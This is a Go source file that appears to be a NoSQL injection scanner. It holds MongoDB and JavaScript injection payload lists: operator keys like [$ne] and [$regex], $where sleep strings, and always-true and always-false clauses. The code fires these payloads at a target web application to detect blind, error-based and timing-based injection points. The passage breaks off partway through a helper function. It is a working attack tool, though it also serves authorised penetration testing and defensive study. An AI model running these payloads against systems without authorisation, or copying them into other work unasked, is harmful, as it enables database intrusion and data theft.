package main

import "C"
import (
	"bufio"
	"bytes"
	"crypto/md5"
	"crypto/tls"
	"encoding/json"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"reflect"
	"regexp"
	"strconv"
	"strings"
	"time"

	"github.com/buger/jsonparser"
	"github.com/montanaflynn/stats"
)

// data
var MongoSpecialCharacters = []string{"'", "\"", "$", ".", ">", "[", "]"}
var MongoSpecialKeyCharacters = []string{"[$]"}
var MongoJSONErrorAttacks = []string{`{"foo": 1}`}
var MongoPrefixes = []string{"'", "\""}
var MongoGetInjection = []string{"[$nin][]", "[$ne]", "[$gt]", "[$lt]"}
var ObjectPrefixes = []string{""}
var JSPrefixes = []string{"", "'", `"`}
var JSSuffixes = []string{"", "'", `"`, `//`, `'}//`}
var JSTrueStrings = []string{
	` && 'a'=='a' && 'a'=='a`,
	` || 'a'=='a' || 'a'=='a`,
	`;return true;`,
}
var JSFalseStrings = []string{
	` && 'a'!='a' && 'a'!='a`,
	`;return false;`,
}
var sleepPlaceholder = `TimeToSleep`
var JSTimingStringsRaw = []string{
	`;sleep(` + sleepPlaceholder + `);`,
}
var JSTimingObjectInjectionsRaw = []string{
	`{"$where":  "sleep(` + sleepPlaceholder + `)"}`,
}

func JSTimingStrings(rawStrings []string, sleepTime int) []string {
	var injections []string
	for _, injection := range rawStrings {
		injections = append(injections, strings.ReplaceAll(injection, sleepPlaceholder, strconv.Itoa(sleepTime)))
	}
	return injections
}

var ObjectInjectionsTrue = []string{
	`{"$where":  "return true"}`,
	`{"$or": [{},{"foo":"1"}]}`,
	//	`,"$or": [{},{"foo":"1"}]`,
}
var ObjectInjectionsFalse = []string{
	`{"$where":  "return false"}`,
	`{"$or": [{"foo":"1"},{"foo":"1"}]}`,
}
var MongoErrorStrings = []string{
	`Uncaught MongoDB\\Driver\\Exception\\CommandException: unknown operator`,
	`(?i)MongoError`,
	`(?i)unterminated string literal`,
}
var JSSyntaxErrorStrings = []string{`SyntaxError`}
var MongooseErrorStrings = []string{
	`(?i)Cast to string failed for value`, // Seen when object being passed when string expected. May indicate that objects will be parsed as objects.
}

// boolean blind
func BlindBooleanInjectionTest(att AttackObject) []InjectionObject {
	i := iterateRegexGetBooleanInjections(att)
	i = append(i, iterateRegexPOSTBooleanInjections(att)...)
	i = append(i, iterateJSGetBooleanInjections(att)...)
	i = append(i, iterateJSPostBooleanInjections(att)...)
	i = append(i, iterateObjectInjections(att)...)
	return i
}
func isBlindInjectable(baseline, trueRes, falseRes HTTPResponseObject) bool {
	if hasNOSQLError(falseRes.Body) || hasNOSQLError(trueRes.Body) {
		// Error response, which might indicate injection, but should be caught by error scanner
		return false
	}
	if hasJSError(falseRes.Body) || hasJSError(trueRes.Body) {
		// JS error response - we probably have JS injection, but haven't found a proper boolean
		// test string yet.
		return false
	}
	if baseline.ContentEquals(trueRes) && baseline.ContentEquals(falseRes) {
		// no difference in responses
		return false
	}
	if baseline.ContentEquals(trueRes) && !baseline.ContentEquals(falseRes) {
		return true
	}
	if !baseline.ContentEquals(trueRes) && baseline.ContentEquals(falseRes) {
		return true
	}
	return false
}
func runInjection(baseline, trueObject, falseObject AttackObject, key, injectedKey, trueVal, falseVal string) (InjectionObject, bool) {
	baseline.IgnoreCache = true
	trueObject.IgnoreCache = true
	falseObject.IgnoreCache = true

	baselineRes, err := baseline.Send()
	if err != nil {
		fmt.Println(err)
	}

	trueRes, err := trueObject.Send()
	if err != nil {
		fmt.Println(err)
	}

	falseRes, err := falseObject.Send()
	if err != nil {
		fmt.Println(err)
	}
	injectable := InjectionObject{}
	if isBlindInjectable(baselineRes, trueRes, falseRes) {
		injectable = InjectionObject{
			Type:            Blind,
			AttackObject:    baseline,
			InjectableParam: key,
			InjectedParam:   injectedKey,
			InjectedValue:   "true: " + trueVal + ", false: " + falseVal,
		}
		return injectable, true
	}
	return injectable, false
}
func iterateRegexGetBooleanInjections(att AttackObject) []InjectionObject {
	var injectables []InjectionObject

	trueRegex := `.*`
	falseRegex := `a^`

	original_params := att.QueryParams()
	keys := make([]string, 0)

	// Get list of keys
	for k, _ := range original_params {
		keys = append(keys, k)
	}

	baseline := att.Copy()
	baseline2 := att.Copy()
	// Set all to empty keys, and see if we can still get a baseline - this will allow us to get
	// a full injection, unlike something like user=john.*, which might give a baseline of a single
	// record, we would prefer user=.*, though in some cases, we might still need to keep the prefix
	for _, key := range keys {
		baseline2.SetQueryParam(key, "")
	}
	baselineRes2, err := baseline2.Send()
	if err == nil && !hasJSError(baselineRes2.Body) && !hasNOSQLError(baselineRes2.Body) {
		baseline = baseline2
	}

	/**
	 *	Some apps will have multiple parameters that interact.
	 *  so we need to ensure that we try every combination of
	 *  parameters to maximize injection findings.
	 */
	for keylist := range StringCombinations(keys) {
		//for each combo, we will first set the value of each key to the always true regex
		trueObj := baseline.Copy()
		for _, key := range keylist {
			injectedKey := key + `[$regex]`
			trueObj.ReplaceQueryParam(key, injectedKey, trueRegex)
		}

		//Then test each key individually for boolean injection.
		for _, key := range keylist {
			injectedKey := key + `[$regex]`
			falseObj := trueObj.Copy()
			falseObj.SetQueryParam(injectedKey, falseRegex)

			injectable, injectionSuccess := runInjection(baseline, trueObj, falseObj, key, injectedKey, trueRegex, falseRegex)
			if injectionSuccess {
				injectables = append(injectables, injectable)
			}
		}
	}
	return Unique(injectables)
}
func iterateRegexPOSTBooleanInjections(att AttackObject) []InjectionObject {
	var injectables []InjectionObject

	baseline := att
	trueRegex := `{"$regex": ".*"}`
	falseRegex := `{"$regex": "a^"}`
	injectKeys := true

	/**
	 *	Some apps will have multiple parameters that interact.
	 *  so we need to ensure that we try every combination of
	 *  parameters to maximize injection findings.
	 */
	for keylist := range BodyItemCombinations(att.BodyValues) {
		trueObj := baseline.Copy()

		//for each combo, we will first set the value of each key to the always true regex
		for _, pattern := range keylist {
			trueObj.ReplaceBodyObject(pattern.Value, trueRegex, injectKeys, pattern.Placement)
		}
		falseObj := trueObj.Copy()
		//Then test each key individually for boolean injection.
		for i, pattern := range keylist {
			falseObj.ReplaceBodyObject(trueRegex, falseRegex, injectKeys, i)

			injectable, injectionSuccess := runInjection(baseline, trueObj, falseObj, pattern.Value, pattern.Value, trueRegex, falseRegex)
			if injectionSuccess {
				injectables = append(injectables, injectable)
			}
			falseObj.ReplaceBodyObject(falseRegex, trueRegex, injectKeys, -1)
		}
	}
	return Unique(injectables)
}
func iterateJSGetBooleanInjections(att AttackObject) []InjectionObject {
	var injectables []InjectionObject

	original_params := att.QueryParams()
	keys := make([]string, 0)

	// Get list of keys
	for k, _ := range original_params {
		keys = append(keys, k)
	}

	/**
	 *	Some apps will have multiple parameters that interact.
	 *  so we need to ensure that we try every combination of
	 *  parameters to maximize injection findings.
	 */
	for _, quoteType := range []string{"'", "\""} {
		// try with both single quoted and double quoted strings
		injections := JSInjections(quoteType)
		for keylist := range StringCombinations(keys) {
			for trueJS, falseInjections := range injections {
				// Assign all keys in this combination to True
				trueObj := att.Copy()
				for _, key := range keylist {
					trueObj.SetQueryParam(key, original_params[key]+trueJS)
				}

				falseObj := trueObj.Copy()
				for _, key := range keylist {
					for _, falseJS := range falseInjections {
						injection := original_params[key] + falseJS
						falseObj.SetQueryParam(key, injection)
						injectable, injectionSuccess := runInjection(att, trueObj, falseObj, key, key, original_params[key]+trueJS, injection)
						if injectionSuccess {
							injectables = append(injectables, injectable)
						}
						falseObj.SetQueryParam(key, original_params[key])
					}

				}
			}
		}
	}
	return Unique(injectables)
}
func iterateJSPostBooleanInjections(att AttackObject) []InjectionObject {
	var injectables []InjectionObject

	/**
	 *	Some apps will have multiple parameters that interact.
	 *  so we need to ensure that we try every combination of
	 *  parameters to maximize injection findings.
	 */
	for _, quoteType := range []string{"'"} {
		// try with both single quoted and double quoted strings
		injections := JSInjections(quoteType)
		for keylist := range BodyItemCombinations(att.BodyValues) {
			for trueJS, falseInjections := range injections {
				// Assign all keys in this combination to True

				trueObj := att.Copy()
				for _, key := range keylist {
					injection := `"` + key.Value + trueJS + `"`
					trueObj.ReplaceBodyObject(key.Value, injection, false, key.Placement)
				}

				for i, key := range keylist {
					for _, falseJS := range falseInjections {
						falseObj := trueObj.Copy()
						injection := `"` + key.Value + falseJS + `"`
						falseObj.ReplaceBodyObject(key.Value+trueJS, injection, false, i)
						injectable, injectionSuccess := runInjection(att, trueObj, falseObj, key.Value, key.Value, key.Value+trueJS, injection)
						if injectionSuccess {
							injectables = append(injectables, injectable)
						}
					}
				}
			}
		}
	}
	return Unique(injectables)
}
func iterateObjectInjections(att AttackObject) []InjectionObject {
	var injectables []InjectionObject

	trueRequest := att.Copy()
	falseRequest := att.Copy()
	for _, trueObject := range ObjectInjectionsTrue {
		trueRequest.SetBody(trueObject)
		for _, falseObject := range ObjectInjectionsFalse {
			falseRequest.SetBody(falseObject)
			injectable, injectionSuccess := runInjection(att, trueRequest, falseRequest, "Body", "", trueObject, falseObject)
			if injectionSuccess {
				injectables = append(injectables, injectable)
			}
		}
	}
	return Unique(injectables)
}

// error scanner
func ErrorBasedInjectionTest(att AttackObject) []InjectionObject {
	var injectables []InjectionObject
	injectables = append(injectables, injectSpecialCharsIntoQuery(att)...)
	injectables = append(injectables, injectSpecialCharsIntoBody(att)...)
	return injectables
}
func hasNOSQLError(body string) bool {
	mongoErrors := searchError(body, MongoErrorStrings)
	mongooseErrors := searchError(body, MongooseErrorStrings)

	return mongoErrors || mongooseErrors
}
func hasJSError(body string) bool {
	jsErrors := searchError(body, JSSyntaxErrorStrings)
	return jsErrors
}
func searchError(body string, errorList []string) bool {
	for _, pattern := range errorList {
		matched, err := regexp.MatchString(pattern, body)
		if err != nil {
			log.Fatal(err)
		}
		if matched {
			return true
		}
	}
	return false
}
func injectSpecialCharsIntoQuery(att AttackObject) []InjectionObject {
	i := iterateGetInjections(att, MongoSpecialCharacters, false)
	i = append(i, iterateGetInjections(att, MongoSpecialKeyCharacters, true)...)
	return i
}
func injectSpecialCharsIntoBody(att AttackObject) []InjectionObject {
	i := iterateBodyInjections(att, MongoSpecialCharacters, false)
	i = append(i, iterateBodyInjections(att, MongoSpecialKeyCharacters, true)...)
	i = append(i, iterateBodyInjections(att, MongoJSONErrorAttacks, true)...)
	return i
}
func iterateBodyInjections(att AttackObject, injectionList []string, injectKeys bool) []InjectionObject {
	var injectables []InjectionObject
	for _, injection := range injectionList {
		for _, pattern := range att.BodyValues {
			att.ReplaceBodyObject(pattern.Value, injection, injectKeys, pattern.Placement)
			res, _ := att.Send()
			if hasNOSQLError(res.Body) {
				var injectable = InjectionObject{
					Type:            Error,
					AttackObject:    att,
					InjectableParam: pattern.Value,
					InjectedParam:   injection,
				}
				injectables = append(injectables, injectable)
			}

			att.RestoreBody() //reset value to default
		}
	}
	return injectables
}
func iterateGetInjections(att AttackObject, injectionList []string, injectKeys bool) []InjectionObject {
	var injectables []InjectionObject
	for _, injection := range injectionList {
		for k, v := range att.QueryParams() {
			injectedValue := v
			injectedKey := k
			if injectKeys {
				att.ReplaceQueryParam(k, k+injection, v)
				injectedKey = k + injection
			} else {
				att.SetQueryParam(k, injection)
				injectedValue = injection
			}
			res, _ := att.Send()
			if hasNOSQLError(res.Body) {
				var injectable = InjectionObject{
					Type:            Error,
					AttackObject:    att,
					InjectableParam: k,
					InjectedParam:   injectedKey,
					InjectedValue:   injectedValue,
				}
				injectables = append(injectables, injectable)
			}

			//reset value to default
			if injectKeys {
				att.ReplaceQueryParam(k+injection, k, v)
			} else {
				att.SetQueryParam(k, v)
			}
		}
	}
	return injectables
}

// timing
var sleepTimeMS int = 500

func TimingInjectionTest(att AttackObject) []InjectionObject {
	att.IgnoreCache = true // Ensure we catch all instances of timing attacks
	i := iterateTimingGetInjections(att)
	i = append(i, iteratePostTimingInjections(att)...)
	i = append(i, iteratePostObjectInections(att)...)
	att.IgnoreCache = false // return to default
	return i
}
func measureRequest(request AttackObject) float64 {
	start := time.Now()
	_, err := request.Send()
	if err != nil {
		fmt.Printf("Error sending request: %+v\n", err)
	}
	d := time.Since(start)
	return d.Seconds()
}
func baseline(att AttackObject) []float64 {
	var baselineTimes []float64

	for i := 0; i < 3; i++ {
		baselineTimes = append(baselineTimes, measureRequest(att))
	}
	return baselineTimes
}
func isTimingInjectable(baselines []float64, injectionTime float64) bool {
	data := stats.LoadRawData(baselines)
	mean, _ := stats.Mean(data)
	stdDev, _ := stats.StdDevS(data)

	if injectionTime > (float64(sleepTimeMS)/1000) && injectionTime > (mean+2*stdDev) {
		return true
	}
	return false
}
func iterateTimingGetInjections(att AttackObject) []InjectionObject {
	baselineTimes := baseline(att)
	var injectables []InjectionObject
	params := att.QueryParams()

	for key := range params {
		for _, prefix := range JSPrefixes {
			for _, suffix := range JSSuffixes {
				for _, tInjection := range JSTimingStrings(JSTimingStringsRaw, sleepTimeMS) {
					for _, keepVal := range []string{"", params[key]} {
						attackObj := att.Copy()
						attackString := keepVal + prefix + tInjection + suffix
						attackObj.SetQueryParam(key, attackString)
						timing := measureRequest(attackObj)
						if isTimingInjectable(baselineTimes, timing) {
							injectable := InjectionObject{
								Type:            Timed,
								AttackObject:    attackObj,
								InjectableParam: key,
								InjectedParam:   keepVal,
								InjectedValue:   attackString,
							}
							injectables = append(injectables, injectable)
						}
					}
				}
			}
		}
	}
	return Unique(injectables)
}
func iteratePostTimingInjections(att AttackObject) []InjectionObject {
	baselineTimes := baseline(att)
	var injectables []InjectionObject

	for _, bodyValue := range att.BodyValues {
		for _, prefix := range JSPrefixes {
			for _, suffix := range JSSuffixes {
				for _, tInjection := range JSTimingStrings(JSTimingStringsRaw, sleepTimeMS) {
					for _, keepVal := range []string{"", bodyValue.Value} {
						for _, wrapQuote := range []string{"", "\""} {
							attackObj := att.Copy()
							attackString := wrapQuote + keepVal + prefix + tInjection + suffix + wrapQuote
							attackObj.ReplaceBodyObject(bodyValue.Value, attackString, false, bodyValue.Placement)
							timing := measureRequest(attackObj)
							if isTimingInjectable(baselineTimes, timing) {
								injectable := InjectionObject{
									Type:            Timed,
									AttackObject:    attackObj,
									InjectableParam: bodyValue.Value,
									InjectedParam:   bodyValue.Value,
									InjectedValue:   attackString,
								}
								injectables = append(injectables, injectable)
							}
						}
					}
				}
			}
		}
	}

	return Unique(injectables)
}
func iteratePostObjectInections(att AttackObject) []InjectionObject {
	baselineTimes := baseline(att)
	var injectables []InjectionObject

	timedRequest := att.Copy()
	for _, tInjection := range JSTimingStrings(JSTimingObjectInjectionsRaw, sleepTimeMS) {
		timedRequest.SetBody(tInjection)
		timing := measureRequest(timedRequest)
		if isTimingInjectable(baselineTimes, timing) {
			injectable := InjectionObject{
				Type:            Timed,
				AttackObject:    timedRequest,
				InjectableParam: "Whole Body",
				InjectedParam:   "Whole Body",
				InjectedValue:   tInjection,
			}
			injectables = append(injectables, injectable)
		}
	}
	return Unique(injectables)
}

// utils
var injectionClient *http.Client = nil

type BodyItem struct {
	Value     string
	Placement int
}
type AttackObject struct {
	Request      *http.Request
	Client       *http.Client
	Options      ScanOptions
	Body         string
	originalBody string     // Keep the original body, so we can reset it after injecting attack strings.
	BodyValues   []BodyItem // List of all values that can be updated. May include maps or arrays (if body is JSON) - but as Strings
	IgnoreCache  bool       // Whether to leverage the cache on requests.
	requestCache map[string]HTTPResponseObject
}

func NewAttackObject(options ScanOptions) (AttackObject, error) {
	attackObj := AttackObject{}
	attackObj.IgnoreCache = false

	attackObj.requestCache = make(map[string]HTTPResponseObject)

	if options.Request != "" {
		attackObj = parseRequest(options.Request, options)

		if options.UserAgentInput == "" {
			options.UserAgentInput = attackObj.Request.Header.Get("User-Agent")
		}
	} else if options.Target != "" {
		var err error
		if options.RequireHTTPS {
			if options.Target[0:5] != "https" && options.Target[0:4] == "http" {
				options.Target = "https" + options.Target[strings.Index(options.Target, "://"):]
			}
		}
		attackObj.Request, err = http.NewRequest("", options.Target, nil)
		if err != nil {
			log.Fatal(err)
		}
	} else {
		return attackObj, errors.New("You must specify either a target or a request file to scan.")
	}

	if options.RequestData != "" {
		attackObj.SetBody(options.RequestData)
		attackObj.Request.Header.Set("Content-Type", "application/json")
		attackObj.Request.Header.Set("Accept", "application/json")
	}

	attackObj.Options = options
	attackObj.addClient()
	attackObj.Request.Header.Set("User-Agent", options.UserAgent())
	return attackObj, nil
}
func parseRequest(file string, options ScanOptions) AttackObject {
	obj := AttackObject{}
	fh, err := os.Open(file)
	if err != nil {
		log.Fatal(err)
	}
	defer fh.Close()

	data := bufio.NewReader(fh)
	obj.Request, err = http.ReadRequest(data)
	if err != nil {
		log.Fatal(err)
	}

	scheme := "http"
	if options.RequireHTTPS {
		scheme = "https"
	}

	// Update the request to make sure it is properly formed
	obj.Request.RequestURI = ""
	obj.Request.URL, err = url.Parse(scheme + "://" + obj.Request.Host + obj.Request.URL.String())
	if err != nil {
		log.Fatal(err)
	}

	buf := new(bytes.Buffer)
	buf.ReadFrom(obj.Request.Body)
	obj.Body = buf.String()
	obj.originalBody = obj.Body
	obj.extractUpdateableValuesFromBody()

	return obj
}
func (a *AttackObject) addClient() {
	if injectionClient == nil {
		proxy := a.Options.Proxy()
		transport := &http.Transport{
			Dial: (&net.Dialer{
				Timeout: 30 * time.Second,
			}).Dial,
			TLSHandshakeTimeout: 10 * time.Second,
			MaxIdleConns:        20,
			DisableKeepAlives:   true,
			TLSClientConfig:     &tls.Config{InsecureSkipVerify: a.Options.AllowInsecureCertificates},
		}
		if proxy != "" {
			proxyURL, err := url.Parse(proxy)
			if err != nil {
				log.Fatalf("Proxy not set correctly: %s", err)
			} else {
				fmt.Printf("Using proxy %s\n", proxyURL)
				transport.Proxy = http.ProxyURL(proxyURL)
			}
		}
		injectionClient = &http.Client{
			Timeout:   10 * time.Second,
			Transport: transport,
		}
	}
	a.Client = injectionClient
}
func (a *AttackObject) Hash() string {
	serial := a.Body + a.Request.URL.String() + strconv.FormatBool(a.IgnoreCache) + a.Request.Method
	md5 := md5.Sum([]byte(serial))
	return string(md5[:])
}
func (a *AttackObject) Copy() AttackObject {
	attackObj, _ := NewAttackObject(a.Options)
	attackObj.Body = a.Body
	attackObj.IgnoreCache = a.IgnoreCache
	copy(attackObj.BodyValues, a.BodyValues)
	attackObj.originalBody = a.originalBody
	attackObj.Request.URL.RawQuery = a.Request.URL.RawQuery
	attackObj.Request.Method = a.Request.Method
	attackObj.Request.Header = a.Request.Header.Clone()
	return attackObj
}
func (a *AttackObject) SetURL(u string) {
	parsedURL, err := url.Parse(u)
	if err != nil {
		log.Fatal(err)
	}
	a.Request.URL = parsedURL
}
func (a *AttackObject) QueryParams() map[string]string {
	q := a.Request.URL.Query()
	m := map[string]string{}
	for k, v := range q {
		m[k] = v[0]
	}
	return m
}
func (a *AttackObject) QueryString() string {
	return a.Request.URL.RawQuery
}
func (a *AttackObject) SetQueryParam(key string, payload string) {
	q := a.Request.URL.Query()
	q[key][0] = payload
	a.Request.URL.RawQuery = q.Encode()
}
func (a *AttackObject) ReplaceQueryParam(oldkey string, key string, value string) {
	q := a.Request.URL.Query()
	q.Del(oldkey)
	q.Add(key, value)
	a.Request.URL.RawQuery = q.Encode()
}
func (a *AttackObject) setBodyQueryParam(pattern string, payload string, replaceKey bool) error {
	u, err := url.ParseRequestURI("/?" + a.Body)
	if err != nil {
		return err
	}
	q := u.Query()
	for key, vSlice := range q {
		if replaceKey && key == pattern {
			q[payload] = vSlice
			delete(q, key)
		} else {
			for i, v := range vSlice {
				if url.QueryEscape(v) == pattern {
					vSlice[i] = payload
				}
			}
			q[key] = vSlice
		}
	}
	a.Body = q.Encode()
	return nil
}
func strReplace(source, pattern, replacement string, index int) string {
	if index == -1 {
		return strings.ReplaceAll(source, pattern, replacement)
	} else {
		var newBody string
		components := strings.Split(source, pattern)
		for i, substring := range components {
			if i == len(components)-1 {
				newBody = newBody + substring
				if i == index && strings.HasSuffix(source, pattern) {
					newBody = newBody + replacement
				}
			} else if i == index {
				newBody = newBody + substring + replacement
			} else {
				newBody = newBody + substring + pattern
			}
		}
		return newBody
	}
}
func (a *AttackObject) setBodyJSONParam(pattern string, payload string, replaceKey bool, index int) error {
	switch jsonType(pattern) {
	case "string":
		// string should be surrounded by double quotes
		pattern = `"` + pattern + `"`
		a.Body = strReplace(a.Body, pattern, payload, index)
	case "number", "boolean", "null":
		// objects that are not enclosed with quotes should always be values (not keys)
		// and thus prefixed with a colon or object opener and zero or more spaces
		// they also should be followed by a comma, or closure of an array or object.
		pattern = `(?P<Prefix>[\[,:]\s*?)(?P<Payload>` + pattern + `)(?P<Suffix>\s*?[,\]\}])`
		re := regexp.MustCompile(pattern)
		submatches := re.FindAllStringSubmatch(a.Body, -1)
		names := re.SubexpNames()
		m := map[string]string{}
		m2 := []map[string]string{}
		// If we have multiple matches, they may have differing prefixes and suffixes
		// so we'll go through and create a new regex and payload to exact match each.
		for count, submatch := range submatches {
			if index != -1 && index != count {
				continue
			}
			m = make(map[string]string)
			for i, n := range submatch {
				m[names[i]] = n
			}
			m2 = append(m2, m)
		}
		var newRegex string
		var newPayload string
		for _, finding := range m2 {
			newRegex = finding["Prefix"] + finding["Payload"] + finding["Suffix"]
			newPayload = finding["Prefix"] + payload + finding["Suffix"]
			re = regexp.MustCompile(newRegex)
			a.Body = re.ReplaceAllLiteralString(a.Body, newPayload)
		}

	default:
		a.Body = strReplace(a.Body, pattern, payload, index)
	}
	return nil
}
func (a *AttackObject) ReplaceBodyObject(pattern string, payload string, replaceKey bool, index int) {
	if a.bodyIsJSON() {
		a.setBodyJSONParam(pattern, payload, replaceKey, index)
	} else {
		a.urlDecodeBody()
		a.setBodyQueryParam(pattern, payload, replaceKey)
	}
	a.Request.ContentLength = int64(len(a.Body))
}
func (a *AttackObject) bodyIsJSON() bool {
	contentType := a.Request.Header.Get("Content-Type")
	if contentType == "application/json" {
		return true
	}
	if isJSON(a.Body) {
		return true
	}
	return false
}
func (a *AttackObject) SetBody(body string) {
	a.Body = body
	a.originalBody = body

	if a.Body == "" {
		a.Request.Method = "GET"
		return
	} else {
		a.Request.Method = "POST"
	}

	if isJSON(a.Body) {
		a.Request.Header.Set("Content-Type", "application/json")
	} else {
		a.Request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		a.urlEncodeBody()
		a.originalBody = a.Body
	}
	a.extractUpdateableValuesFromBody()
	a.Request.ContentLength = int64(len(a.Body))
}
func (a *AttackObject) urlEncodeBody() {
	u, err := url.ParseRequestURI("/?" + a.Body)
	if err != nil {
		log.Fatal(err)
	}
	q := u.Query()
	a.Body = q.Encode()
}
func (a *AttackObject) urlDecodeBody() {
	decoded, err := url.QueryUnescape(a.Body)
	if err != nil {
		log.Fatal(err)
		return
	}
	a.Body = decoded
}
func (a *AttackObject) RestoreBody() {
	a.Body = a.originalBody
	a.Request.ContentLength = int64(len(a.Body))
}
func (a *AttackObject) extractUpdateableValuesFromBody() {
	var values []string
	valueCounter := map[string]int{}

	if isJSON(a.Body) {
		values = FlattenJSON(a.Body)
	} else {
		values = extractUpdateableQueryValuesFromBody(a.Body)
	}

	for _, v := range values {
		if _, ok := valueCounter[v]; ok {
			valueCounter[v]++
		} else {
			valueCounter[v] = 0
		}
		a.BodyValues = append(a.BodyValues, BodyItem{v, valueCounter[v]})
	}
}
func extractUpdateableQueryValuesFromBody(body string) []string {
	var values []string
	u, err := url.ParseRequestURI("/?" + body)
	if err != nil {
		log.Fatal(err)
	}
	q := u.Query()
	for k, v := range q {
		values = append(values, k)
		for _, val := range v {
			values = append(values, val)
		}
	}
	return values
}
func (a *AttackObject) setRequestBody() {
	a.Request.Body = ioutil.NopCloser(strings.NewReader(a.Body))
}

var requestCache map[string]HTTPResponseObject = map[string]HTTPResponseObject{}

func (a *AttackObject) Send() (HTTPResponseObject, error) {
	if !a.IgnoreCache {
		if res, ok := a.requestCache[a.Hash()]; ok {
			return res, nil
		}
	}

	a.setRequestBody()
	url := a.Request.URL.String()
	obj := HTTPResponseObject{url, "", nil, 0}

	// fmt.Println("===================================")
	// fmt.Println("➡ Sending Request")
	// fmt.Println("URL:", a.Request.URL.String())
	// fmt.Println("Method:", a.Request.Method)
	// fmt.Println("Headers:", a.Request.Header)
	// fmt.Println("Body:", a.Body)
	// fmt.Println("===================================")

	resp, err := a.Client.Do(a.Request)

	if err != nil {
		log.Fatal(err)
		return obj, errors.New("Unable to retrieve url")
	}

	obj.Header = resp.Header
	obj.StatusCode = resp.StatusCode

	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println(err)
		return obj, errors.New("Unable to read response body")
	}

	obj.Body = string(body)
	a.requestCache[a.Hash()] = obj
	return obj, nil
}

func (this *HTTPResponseObject) DeepEquals(cmp HTTPResponseObject) bool {
	headerEquals := reflect.DeepEqual(this.Header, cmp.Header)
	return this.ContentEquals(cmp) && headerEquals
}
func (this *HTTPResponseObject) ContentEquals(cmp HTTPResponseObject) bool {
	statusEquals := this.StatusCode == cmp.StatusCode
	bodyEquals := this.Body == cmp.Body
	return statusEquals && bodyEquals
}

type HTTPResponseObject struct {
	Url        string
	Body       string
	Header     map[string][]string
	StatusCode int
}

type InjectionType int

const (
	Blind = InjectionType(iota)
	Timed
	Error
	GetParam
)

func (it InjectionType) String() string {
	switch it {
	case Blind:
		return "Blind NoSQL Injection"
	case Timed:
		return "Timing based NoSQL Injection"
	case Error:
		return "Error based NoSQL Injection"
	case GetParam:
		return "Get Parameter NoSQL Injection"
	}
	return ""
}

type InjectionObject struct {
	Type            InjectionType
	AttackObject    AttackObject
	InjectableParam string
	InjectedParam   string
	InjectedValue   string
	Prefix          string
	Suffix          string
}

func (i *InjectionObject) Print() {
	fmt.Print(i.String())
}
func (i *InjectionObject) String() string {
	var b bytes.Buffer
	fmt.Fprintf(&b, "Found %s:\n\tURL: %s\n\tparam: %s\n\tInjection: %s=%s\n\n", i.Type, i.AttackObject.Request.URL, i.InjectableParam, i.InjectedParam, i.InjectedValue)
	return b.String()
}
func (i *InjectionObject) Hash() string {
	serial := i.Type.String() + i.AttackObject.Request.URL.String() + i.InjectableParam + i.InjectedParam + i.InjectedValue
	md5 := md5.Sum([]byte(serial))
	return string(md5[:])
}
func Unique(injections []InjectionObject) []InjectionObject {
	found := make(map[string]bool)
	var uniques []InjectionObject

	for _, injection := range injections {
		if !found[injection.Hash()] {
			uniques = append(uniques, injection)
		}
		found[injection.Hash()] = true
	}
	return uniques
}

func jsonType(jsonData string) string {
	b := []byte(jsonData)
	_, vtype, _, err := jsonparser.Get(b)
	if err != nil || vtype.String() == "unknown" {
		return "string"
	} else {
		return vtype.String()
	}
}
func FlattenJSON(jsonData string) []string {
	b := []byte(jsonData)
	var s []string
	return jsonObjectHandler(b, s)
}
func isJSON(s string) bool {
	var js map[string]interface{}
	err := json.Unmarshal([]byte(s), &js)
	return err == nil
}
func jsonArrayHandler(arrayData []byte, flattenedSlice []string) []string {
	jsonparser.ArrayEach(arrayData, func(value []byte, dataType jsonparser.ValueType, offset int, err error) {
		flattenedSlice = append(flattenedSlice, string(value))
		switch dataType.String() {
		case "object":
			flattenedSlice = jsonObjectHandler([]byte(string(value)), flattenedSlice)
		case "array":
			flattenedSlice = jsonArrayHandler(value, flattenedSlice)
		}
	})
	return flattenedSlice
}
func jsonObjectHandler(jsonData []byte, flattenedSlice []string) []string {
	jsonparser.ObjectEach(jsonData, func(key []byte, value []byte, dataType jsonparser.ValueType, offset int) error {
		flattenedSlice = append(flattenedSlice, string(key))
		flattenedSlice = append(flattenedSlice, string(value))

		switch dataType.String() {
		case "object":
			flattenedSlice = jsonObjectHandler(value, flattenedSlice)
		case "array":
			flattenedSlice = jsonArrayHandler(value, flattenedSlice)
		}
		return nil
	})
	return flattenedSlice
}

type ScanOptions struct {
	Target                    string
	Request                   string
	ProxyInput                string
	UserAgentInput            string
	RequestData               string
	RequireHTTPS              bool
	AllowInsecureCertificates bool
}

func (s *ScanOptions) Proxy() string {
	if s.ProxyInput == "" {
		return os.Getenv("HTTP_PROXY")
	} else {
		return s.ProxyInput
	}

}
func (s *ScanOptions) UserAgent() string {
	return s.UserAgentInput
}

func Keys(aMap map[string]string) []string {
	keys := make([]string, len(aMap))
	i := 0
	for k, _ := range aMap {
		keys[i] = k
		i++
	}
	return keys
}
func Values(aMap map[string]string) []string {
	values := make([]string, len(aMap))
	i := 0
	for _, v := range aMap {
		values[i] = v
		i++
	}
	return values
}
func GetTransformedValues(kvList map[string]string, keyTransform func(string) string, valTransform func(string) string, transformKeys bool, transformValues bool) [][]map[string]string {
	var result [][]map[string]string //list of new (kv) maps
	for combo := range StringCombinations(Keys(kvList)) {
		var comboObj []map[string]string
		for _, k := range combo {
			values := make(map[string]string)
			values["oldkey"] = k
			values["oldvalue"] = kvList[k]
			values["newkey"] = k
			values["newvalue"] = kvList[k]

			if transformKeys {
				values["newkey"] = keyTransform(k)
			}
			if transformValues {
				values["newvalue"] = valTransform(kvList[k])
			}
			comboObj = append(comboObj, values)
		}
		result = append(result, comboObj)
	}
	return result
}
func JSInjections(quoteType string) map[string][]string {
	attacks := map[string][]string{}
	for _, prefix := range JSPrefixes {
		for _, suffix := range JSSuffixes {
			for _, tInjection := range JSTrueStrings {
				tInjection = prefix + tInjection + suffix
				tInjection = strings.ReplaceAll(tInjection, "'", quoteType)
				for _, finjection := range JSFalseStrings {
					finjection = prefix + finjection + suffix
					finjection = strings.ReplaceAll(finjection, "'", quoteType)
					if _, ok := attacks[tInjection]; ok {
						attacks[tInjection] = append(attacks[tInjection], finjection)
					} else {
						attacks[tInjection] = []string{finjection}
					}
				}
			}
		}
	}
	return attacks
}
func StringCombinations(data []string) <-chan []string {
	c := make(chan []string)
	iData := make([]interface{}, len(data))
	for i, v := range data {
